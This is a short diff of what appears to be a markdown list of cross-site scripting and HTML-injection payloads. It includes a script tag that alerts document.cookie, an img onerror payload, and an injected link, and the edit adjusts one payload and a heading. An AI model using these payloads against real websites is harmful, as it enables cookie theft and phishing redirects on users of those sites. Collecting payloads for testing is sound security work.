@@ -33,9 +33,9 @@ nu11secur1ty<script>alert(document.cookie)</script>
 </span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=http://example.com/> onerror=alert(1) /></span>
 ```
 
-## - 0.4
+- 0.4
 ```
-</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=http://example.com/>
+</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>welcome<a href=http://example.com/>
 ```
 
 ## without error report + link to malicious URL
